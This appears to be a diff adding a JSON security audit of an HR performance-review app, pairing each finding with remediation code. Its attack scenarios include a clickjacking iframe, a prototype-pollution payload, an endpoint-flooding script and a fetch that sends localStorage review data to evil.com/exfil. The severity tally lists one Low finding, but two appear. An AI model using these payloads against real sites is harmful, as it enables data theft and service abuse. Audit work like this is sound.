+      "remediation": "Add non-root user to Dockerfiles:\n\n**Dockerfile.whisper:**\n```dockerfile\nFROM python:3.11-slim\n\nWORKDIR /app\n\n# ... existing RUN commands ...\n\n# Create non-root user\nRUN groupadd -r whisper && useradd -r -g whisper -u 1000 whisper\n\n# Copy files\nCOPY hr-performance-app/server/requirements-faster.txt ./requirements.txt\nRUN pip install --no-cache-dir -r requirements.txt\n\nCOPY hr-performance-app/server/whisper_server_faster.py ./app.py\n\n# Create uploads directory with proper permissions\nRUN mkdir -p uploads && chown -R whisper:whisper /app\n\n# Pre-download model as root\nRUN python -c \"from faster_whisper import WhisperModel; WhisperModel('small', device='cpu', compute_type='int8')\"\n\n# Switch to non-root user\nUSER whisper\n\nEXPOSE 3001\nCMD [\"gunicorn\", ...]\n```\n\n**Dockerfile.frontend:**\n```dockerfile\nFROM nginx:alpine\n\nCOPY --from=builder /app/dist /usr/share/nginx/html\nCOPY nginx.conf /etc/nginx/conf.d/default.conf\n\n# Run nginx as non-root (nginx image provides 'nginx' user)\nUSER nginx\n\nEXPOSE 80\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\n```\n\nNote: nginx image may need configuration adjustments to run as non-root (listen on port 8080 instead of 80).",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/250.html",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html",
+        "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user"
+      ]
+    },
+    {
+      "id": "VULN-013",
+      "threat_id": "THREAT-024",
+      "title": "Missing HTTP Security Headers",
+      "severity": "Medium",
+      "cwe": "CWE-693",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\nginx.conf",
+      "line_start": 20,
+      "line_end": 23,
+      "code_snippet": "location / {\n    try_files $uri $uri/ /index.html;\n}\n# NO security headers added",
+      "description": "The nginx configuration lacks critical HTTP security headers including X-Frame-Options (clickjacking protection), X-Content-Type-Options (MIME-sniffing prevention), Strict-Transport-Security (HTTPS enforcement), Referrer-Policy (information leakage prevention), and Permissions-Policy (feature restriction). This exposes the application to various attacks including clickjacking, MIME-sniffing attacks, and protocol downgrade attacks.",
+      "attack_scenario": "**Clickjacking Attack:**\n1. Attacker creates malicious website: evil.com\n2. Embeds TSS PPM app in invisible iframe:\n\n```html\n<iframe src=\"https://app.tss.com\" style=\"opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;\"></iframe>\n<button style=\"position:absolute; top:200px; left:300px;\">Click for free prize!</button>\n```\n\n3. User visits evil.com and clicks visible button\n4. Actually clicks invisible \"Clear Session\" button in iframe (no X-Frame-Options to prevent framing)\n5. Session data deleted without user realizing\n\n**MIME-Sniffing Attack:**\n1. Attacker uploads image.jpg that contains JavaScript\n2. Browser sniffs content type and executes as JavaScript (no X-Content-Type-Options: nosniff)\n3. Malicious script runs in application context",
+      "impact": "Clickjacking can trick users into performing unintended actions. MIME-sniffing can lead to XSS. Lack of HSTS allows MITM downgrade attacks. Referrer leakage may expose session codes in URLs.",
+      "remediation": "Add security headers to nginx.conf:\n\n```nginx\nlocation / {\n    try_files $uri $uri/ /index.html;\n    \n    # Prevent clickjacking\n    add_header X-Frame-Options \"DENY\" always;\n    \n    # Prevent MIME-sniffing\n    add_header X-Content-Type-Options \"nosniff\" always;\n    \n    # Enable HSTS (if using HTTPS)\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n    \n    # Control referer information\n    add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n    \n    # Disable dangerous features\n    add_header Permissions-Policy \"camera=(), microphone=(), geolocation=(), payment=()\" always;\n    \n    # XSS protection (deprecated but still useful for older browsers)\n    add_header X-XSS-Protection \"1; mode=block\" always;\n}\n```\n\nAlso ensure HTTPS is enabled and redirects from HTTP to HTTPS are configured.",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/693.html",
+        "https://owasp.org/www-project-secure-headers/",
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers"
+      ]
+    },
+    {
+      "id": "VULN-014",
+      "threat_id": "THREAT-019",
+      "title": "Prototype Pollution via Unsafe JSON.parse",
+      "severity": "Medium",
+      "cwe": "CWE-1321",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js",
+      "line_start": 19,
+      "line_end": 27,
+      "code_snippet": "function getAllSessions() {\n  try {\n    const stored = localStorage.getItem(STORAGE_KEY);\n    return stored ? JSON.parse(stored) : {};\n  } catch (e) {\n    console.error('Error reading sessions from localStorage:', e);\n    return {};\n  }\n}",
+      "description": "The getAllSessions function uses JSON.parse without protection against prototype pollution. If an attacker can inject malicious JSON into localStorage (via XSS or direct manipulation), they could pollute Object.prototype with malicious properties. While the current codebase doesn't show obvious exploitation paths, prototype pollution can lead to property injection, authentication bypass, or RCE in certain contexts.",
+      "attack_scenario": "1. Attacker gains access to localStorage (via XSS or DevTools)\n2. Modifies hr_performance_sessions value to include prototype pollution payload:\n\n```json\n{\n  \"ABC1234567\": {\n    \"__proto__\": {\n      \"isAdmin\": true,\n      \"authenticated\": true,\n      \"role\": \"admin\"\n    },\n    \"employeeName\": \"John Doe\"\n  }\n}\n```\n\n3. Application calls getAllSessions()\n4. JSON.parse deserializes the __proto__ key\n5. Object.prototype.isAdmin = true (pollutes global prototype)\n6. If application later adds authentication and checks: if (user.isAdmin) { ... }\n7. All objects now have isAdmin=true due to prototype pollution\n8. Authentication bypass or privilege escalation",
+      "impact": "Potential property injection leading to authentication bypass, authorization bypass, or unexpected behavior. Impact depends on how the application uses polluted properties. Currently limited impact but represents a security debt that could become critical if authentication is added.",
+      "remediation": "Use safe JSON parsing with prototype pollution protection:\n\n```javascript\nfunction getAllSessions() {\n  try {\n    const stored = localStorage.getItem(STORAGE_KEY);\n    if (!stored) return {};\n    \n    // Parse with reviver to block __proto__ and constructor\n    const sessions = JSON.parse(stored, (key, value) => {\n      if (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n        console.warn('Prototype pollution attempt blocked:', key);\n        return undefined; // Ignore these keys\n      }\n      return value;\n    });\n    \n    // Alternative: Use Object.create(null) to create object without prototype\n    const safeSessions = Object.create(null);\n    Object.assign(safeSessions, sessions);\n    \n    return safeSessions;\n  } catch (e) {\n    console.error('Error reading sessions from localStorage:', e);\n    return {};\n  }\n}\n```\n\nOr use a library like secure-json-parse:\n\n```javascript\nimport secureJsonParse from 'secure-json-parse';\n\nfunction getAllSessions() {\n  try {\n    const stored = localStorage.getItem(STORAGE_KEY);\n    return stored ? secureJsonParse(stored) : {};\n  } catch (e) {\n    console.error('Error reading sessions from localStorage:', e);\n    return {};\n  }\n}\n```",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/1321.html",
+        "https://portswigger.net/web-security/prototype-pollution",
+        "https://github.com/fastify/secure-json-parse"
+      ]
+    },
+    {
+      "id": "VULN-015",
+      "threat_id": "THREAT-013",
+      "title": "No Input Length Limits Enabling localStorage DoS",
+      "severity": "Medium",
+      "cwe": "CWE-400",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\FormContext.jsx",
+      "line_start": 101,
+      "line_end": 108,
+      "code_snippet": "const updateFormData = useCallback((updates) => {\n  setFormData(prev => {\n    const newData = typeof updates === 'function' ? updates(prev) : { ...prev, ...updates };\n    return newData;\n  });\n  setIsDirty(true);\n}, []);",
+      "description": "The application has no input length limits on text fields. Textarea elements for goals, self-assessment, comments, and other fields accept unlimited input. An attacker could paste megabytes of text causing localStorage quota exhaustion (typically 5-10MB per origin). This prevents saving of current and future sessions, causes data loss, and may crash the browser tab.",
+      "attack_scenario": "1. Employee creates new performance review session\n2. Opens self-assessment textarea\n3. Generates 10MB of text: 'A' * 10485760\n4. Pastes into self-assessment field\n5. Application attempts auto-save after 2.5 seconds\n6. localStorage.setItem() throws QuotaExceededError\n7. Save fails silently (error caught at line 37 of session.js)\n8. User doesn't notice save failed\n9. localStorage now full, cannot save any sessions\n10. All subsequent review sessions cannot be saved\n11. User loses hours of work when closing browser\n12. Other users on same domain also affected (shared quota)",
+      "impact": "Denial of Service via resource exhaustion. Data loss when saves fail silently. Browser tab may freeze or crash with very large inputs. Affects all users on the same domain due to shared localStorage quota.",
+      "remediation": "Add input length limits and quota monitoring:\n\n```javascript\n// Define maximum lengths\nconst MAX_LENGTHS = {\n  employeeName: 200,\n  role: 200,\n  businessUnit: 200,\n  summary: 5000,\n  goalTitle: 300,\n  goalDescription: 2000,\n  competencyNote: 2000,\n  selfAssessment: 10000,\n  comments: 10000\n};\n\n// Add validation in updateFormData\nconst updateFormData = useCallback((updates) => {\n  setFormData(prev => {\n    const newData = typeof updates === 'function' ? updates(prev) : { ...prev, ...updates };\n    \n    // Validate length limits\n    for (const [key, value] of Object.entries(newData)) {\n      if (typeof value === 'string' && MAX_LENGTHS[key]) {\n        if (value.length > MAX_LENGTHS[key]) {\n          console.warn(`Field ${key} exceeds max length`);\n          newData[key] = value.substring(0, MAX_LENGTHS[key]);\n        }\n      }\n    }\n    \n    return newData;\n  });\n  setIsDirty(true);\n}, []);\n\n// Add quota check before save\nfunction checkLocalStorageQuota() {\n  try {\n    const testKey = '__quota_test__';\n    const testData = 'x'.repeat(1024 * 1024); // 1MB test\n    localStorage.setItem(testKey, testData);\n    localStorage.removeItem(testKey);\n    return true;\n  } catch (e) {\n    if (e.name === 'QuotaExceededError') {\n      alert('Storage quota exceeded. Please delete old sessions.');\n      return false;\n    }\n    throw e;\n  }\n}\n```\n\nAdd maxLength attributes to textareas:\n\n```jsx\n<textarea\n  maxLength={MAX_LENGTHS.selfAssessment}\n  value={formData.selfAssessment}\n  onChange={(e) => updateFormData({ selfAssessment: e.target.value })}\n/>\n```",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/400.html",
+        "https://developer.mozilla.org/en-US/docs/Web/API/Storage/setItem",
+        "https://owasp.org/www-community/attacks/Denial_of_Service"
+      ]
+    },
+    {
+      "id": "VULN-016",
+      "threat_id": "THREAT-020",
+      "title": "CORS Misconfiguration Allowing Any Origin",
+      "severity": "Low",
+      "cwe": "CWE-942",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\server\\whisper_server_faster.py",
+      "line_start": 16,
+      "line_end": 17,
+      "code_snippet": "app = Flask(__name__)\nCORS(app)",
+      "description": "The Whisper server enables CORS with default settings (CORS(app) with no origin restrictions). This allows any website to make cross-origin requests to the /transcribe endpoint. While the nginx proxy configuration may limit direct access, misconfiguration or direct exposure could allow malicious websites to abuse the transcription service, wasting resources or performing audio analysis attacks.",
+      "attack_scenario": "1. Whisper server accidentally exposed to internet (misconfigured firewall or nginx)\n2. Attacker discovers /transcribe endpoint at https://api.tss.com:3001/transcribe\n3. Creates malicious website at evil.com with JavaScript:\n\n```javascript\nsetInterval(() => {\n  const formData = new FormData();\n  formData.append('audio', generateLargeAudioFile());\n  fetch('https://api.tss.com:3001/transcribe', {\n    method: 'POST',\n    body: formData\n  });\n}, 1000); // Send request every second\n```\n\n4. Victims visit evil.com\n5. Browser makes cross-origin POST requests (CORS allows it)\n6. Server resources exhausted from multiple sources\n7. Attacker can also use service for free transcription of their own audio",
+      "impact": "Resource abuse if endpoint is exposed. Unauthorized use of computational resources. Potential DoS if combined with other vulnerabilities. However, impact is limited since nginx proxy should prevent direct access in correct deployment.",
+      "remediation": "Restrict CORS to specific origins:\n\n```python\nfrom flask_cors import CORS\n\n# Only allow requests from your frontend domain\nALLOWED_ORIGINS = [\n    'https://app.tss.com',\n    'http://localhost:5173',  # Vite dev server\n    'http://localhost:4173'   # Vite preview\n]\n\nCORS(app, origins=ALLOWED_ORIGINS, methods=['POST', 'GET'], supports_credentials=True)\n```\n\nOr configure CORS in nginx (preferred):\n\n```nginx\nlocation /transcribe {\n    proxy_pass http://whisper:3001/transcribe;\n    \n    # Add CORS headers in nginx instead\n    add_header 'Access-Control-Allow-Origin' 'https://app.tss.com' always;\n    add_header 'Access-Control-Allow-Methods' 'POST, OPTIONS' always;\n    add_header 'Access-Control-Allow-Headers' 'Content-Type' always;\n    \n    if ($request_method = 'OPTIONS') {\n        return 204;\n    }\n}\n```\n\nRemove CORS from Flask:\n\n```python\n# Remove: CORS(app)\n```",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/942.html",
+        "https://portswigger.net/web-security/cors",
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS"
+      ]
+    },
+    {
+      "id": "VULN-017",
+      "threat_id": "THREAT-018",
+      "title": "Whisper Model Downloaded Without Integrity Verification",
+      "severity": "Medium",
+      "cwe": "CWE-353",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\WhisperContext.jsx",
+      "line_start": 120,
+      "line_end": 128,
+      "code_snippet": "transcriber.current = await pipeline(\n  'automatic-speech-recognition',\n  modelId,\n  {\n    device: useBackend,\n    dtype: useBackend === 'webgpu' ? 'fp32' : 'q8',\n    progress_callback: progressCallback\n  }\n);",
+      "description": "The Whisper model (whisper-small ~500MB or whisper-base ~150MB) is downloaded from Hugging Face CDN without integrity verification. No checksums, cryptographic signatures, or Subresource Integrity validation exists. A MITM attacker or compromised CDN could serve a malicious ML model that executes arbitrary code during inference, produces manipulated transcriptions, or exfiltrates audio data.",
+      "attack_scenario": "1. Attacker performs MITM attack on user's connection to cdn.huggingface.co\n2. Intercepts request for whisper-small ONNX model files\n3. Serves malicious model containing exploit code in ONNX runtime\n4. User's browser downloads and caches malicious model\n5. Application loads model with pipeline()\n6. Malicious model exploits ONNX runtime vulnerability during inference\n7. Attacker gains JavaScript execution in browser context\n8. Reads localStorage, exfiltrates performance data, installs keylogger\n9. Alternative: Model produces subtly manipulated transcriptions, changing sentiment of dictated reviews",
+      "impact": "Potential code execution via ML model exploits. Data exfiltration. Manipulated transcription results undermining review accuracy. Cache poisoning affects long-term usage until cache cleared.",
+      "remediation": "Implement model integrity verification:\n\n```javascript\n// Store expected model checksums\nconst MODEL_CHECKSUMS = {\n  'onnx-community/whisper-small': {\n    'onnx/decoder_model_merged_quantized.onnx': 'sha256-ABC123...',\n    'onnx/encoder_model_quantized.onnx': 'sha256-DEF456...',\n    // ... other files\n  },\n  'onnx-community/whisper-base': {\n    // ... checksums\n  }\n};\n\nasync function verifyModelFile(url, expectedChecksum) {\n  const response = await fetch(url);\n  const buffer = await response.arrayBuffer();\n  \n  // Calculate SHA-256 hash\n  const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);\n  const hashArray = Array.from(new Uint8Array(hashBuffer));\n  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');\n  \n  if (`sha256-${hashHex}` !== expectedChecksum) {\n    throw new Error('Model integrity check failed');\n  }\n  \n  return buffer;\n}\n\n// Modify loading to verify checksums\nconst loadModel = useCallback(async (forceBackend = null) => {\n  // ... existing code ...\n  \n  // Download and verify model files before loading\n  const modelFiles = await fetchModelManifest(modelId);\n  for (const file of modelFiles) {\n    const expectedChecksum = MODEL_CHECKSUMS[modelId][file.name];\n    if (expectedChecksum) {\n      await verifyModelFile(file.url, expectedChecksum);\n    }\n  }\n  \n  // Now safe to load\n  transcriber.current = await pipeline(...);\n}, []);\n```\n\nAlternatively:\n1. Self-host models on trusted infrastructure\n2. Use Content Security Policy to whitelist CDN domains\n3. Implement Subresource Integrity for model downloads if supported",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/353.html",
+        "https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity",
+        "https://www.w3.org/TR/SRI/"
+      ]
+    },
+    {
+      "id": "VULN-018",
+      "threat_id": "THREAT-012",
+      "title": "External Analytics Script Without Subresource Integrity",
+      "severity": "Low",
+      "cwe": "CWE-829",
+      "file": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\index.html",
+      "line_start": 9,
+      "line_end": 9,
+      "code_snippet": "<script async src=\"https://plausible.io/js/pa-OVp2RFVy8CfsubEwNvi3F.js\"></script>",
+      "description": "The Plausible Analytics script is loaded from an external CDN without Subresource Integrity (SRI) validation. If the Plausible.io account is compromised, the CDN is MITM'd, or Plausible infrastructure is breached, an attacker could modify the script to exfiltrate data, inject malware, or capture user interactions. While Plausible is privacy-focused and reputable, the lack of SRI means script integrity cannot be verified.",
+      "attack_scenario": "1. Attacker compromises Plausible.io account for TSS\n2. Modifies analytics script at pa-OVp2RFVy8CfsubEwNvi3F.js to include:\n\n```javascript\n// Malicious code appended to legitimate analytics\nsetInterval(() => {\n  const sessions = localStorage.getItem('hr_performance_sessions');\n  if (sessions) {\n    fetch('https://evil.com/exfil', {\n      method: 'POST',\n      body: sessions\n    });\n  }\n}, 10000); // Every 10 seconds\n```\n\n3. All users load modified script\n4. Browser executes malicious code (no SRI to detect tampering)\n5. Performance data continuously exfiltrated\n6. Could also inject keylogger for voice transcriptions",
+      "impact": "Data exfiltration. Malicious script injection. Complete compromise of frontend security. Users cannot detect modified analytics script without SRI.",
+      "remediation": "Add Subresource Integrity to external scripts:\n\n```html\n<!-- Generate SRI hash at https://www.srihash.org/ -->\n<script async \n        src=\"https://plausible.io/js/pa-OVp2RFVy8CfsubEwNvi3F.js\"\n        integrity=\"sha384-HASH_VALUE_HERE\"\n        crossorigin=\"anonymous\"></script>\n```\n\nProcess:\n1. Download current script from Plausible\n2. Generate SRI hash:\n\n```bash\ncurl https://plausible.io/js/pa-OVp2RFVy8CfsubEwNvi3F.js | \n  openssl dgst -sha384 -binary | \n  openssl base64 -A\n```\n\n3. Add integrity attribute with hash\n4. Note: SRI will break if Plausible updates the script\n5. Consider self-hosting analytics or using CSP to whitelist only\n6. Alternative: Use CSP with strict-dynamic to control script loading",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/829.html",
+        "https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity",
+        "https://www.srihash.org/"
+      ]
+    }
+  ],
+  "summary": {
+    "total_vulnerabilities": 18,
+    "by_severity": {
+      "Critical": 3,
+      "High": 7,
+      "Medium": 7,
+      "Low": 1
+    },
+    "by_cwe": {
+      "CWE-287": 1,
+      "CWE-311": 1,
+      "CWE-312": 1,
+      "CWE-330": 1,
+      "CWE-602": 1,
+      "CWE-1021": 1,
+      "CWE-345": 1,
+      "CWE-306": 1,
+      "CWE-78": 1,
+      "CWE-532": 1,
+      "CWE-471": 1,
+      "CWE-250": 1,
+      "CWE-693": 1,
+      "CWE-1321": 1,
+      "CWE-400": 1,
+      "CWE-942": 1,
+      "CWE-353": 1,
+      "CWE-829": 1
+    },
+    "exploitable_count": 15,
+    "false_positives": 0,
+    "needs_authentication": 3,
+    "needs_server_side_fixes": 5,
+    "client_side_only_fixes": 10
+  },
+  "critical_findings": [
+    {
+      "id": "VULN-001",
+      "title": "Complete Absence of Authentication Mechanism",
+      "severity": "Critical",
+      "exploitability": "Trivial - requires only physical/remote access to device",
+      "recommendation": "IMMEDIATE ACTION REQUIRED: Implement authentication system before production deployment"
+    },
+    {
+      "id": "VULN-002",
+      "title": "Unencrypted Sensitive Data in localStorage with No Integrity Checks",
+      "severity": "Critical",
+      "exploitability": "Trivial - open DevTools and view localStorage",
+      "recommendation": "IMMEDIATE ACTION REQUIRED: Implement encryption or move to server-side storage"
+    },
+    {
+      "id": "VULN-003",
+      "title": "Plaintext Storage of Confidential Performance Review Data",
+      "severity": "Critical",
+      "exploitability": "Trivial - file system access to browser profile",
+      "recommendation": "IMMEDIATE ACTION REQUIRED: Encrypt sensitive data at rest"
+    }
+  ],
+  "immediate_actions_required": [
+    "1. Add authentication system with user login and session ownership validation",
+    "2. Implement localStorage encryption using Web Crypto API or move to server-side storage",
+    "3. Add Content Security Policy headers to nginx configuration",
+    "4. Implement rate limiting and authentication on /transcribe endpoint",
+    "5. Add HTTP security headers (X-Frame-Options, HSTS, X-Content-Type-Options)",
+    "6. Configure Docker containers to run as non-root users",
+    "7. Remove or disable sensitive console logging in production builds",
+    "8. Add Subresource Integrity to external scripts (Plausible Analytics)",
+    "9. Implement file validation and resource limits for audio uploads",
+    "10. Add input length limits to prevent localStorage DoS"
+  ],
+  "deployment_recommendation": {
+    "current_state": "UNSAFE FOR PRODUCTION",
+    "reasoning": "Three critical vulnerabilities (no authentication, unencrypted data, plaintext storage) make this application unsuitable for production use with confidential data. The application is acceptable only for non-confidential scenarios in fully trusted environments.",
+    "acceptable_use_cases": [
+      "Internal testing/development environments",
+      "Non-confidential performance reviews",
+      "Environments with guaranteed physical security",
+      "Proof-of-concept demonstrations"
+    ],
+    "required_before_production": [
+      "Authentication and authorization system",
+      "Data encryption at rest and in transit",
+      "Server-side session management",
+      "All security headers implemented",
+      "Rate limiting and DDoS protection",
+      "Audit logging and monitoring",
+      "Security testing and penetration testing",
+      "GDPR compliance review"
+    ]
+  },
+  "references": {
+    "owasp_top_10": [
+      "A01:2021 - Broken Access Control",
+      "A02:2021 - Cryptographic Failures",
+      "A03:2021 - Injection",
+      "A05:2021 - Security Misconfiguration",
+      "A07:2021 - Identification and Authentication Failures"
+    ],
+    "sans_top_25": [
+      "CWE-287: Improper Authentication",
+      "CWE-311: Missing Encryption of Sensitive Data",
+      "CWE-78: OS Command Injection",
+      "CWE-400: Uncontrolled Resource Consumption"
+    ],
+    "compliance_impact": {
+      "GDPR": "CRITICAL - Articles 5(1)(f), 25, 32 violated. Data protection by design/default not implemented. Encryption required.",
+      "SOX": "HIGH - Inadequate controls for financial data if performance reviews affect compensation",
+      "HIPAA": "N/A - Not healthcare data",
+      "PCI-DSS": "N/A - No payment card data"
+    }
+  },
+  "methodology": {
+    "approach": "Manual code review with threat model validation",
+    "tools_used": ["Read", "Grep", "Manual analysis"],
+    "coverage": "Full codebase analysis of frontend (React/Vite), backend (Python/Flask), infrastructure (Docker/nginx)",
+    "limitations": [
+      "Dynamic analysis not performed (no runtime testing)",
+      "Third-party dependencies not deeply audited",
+      "No penetration testing conducted",
+      "Some theoretical vulnerabilities may have lower real-world exploitability"
+    ]
+  }
+}
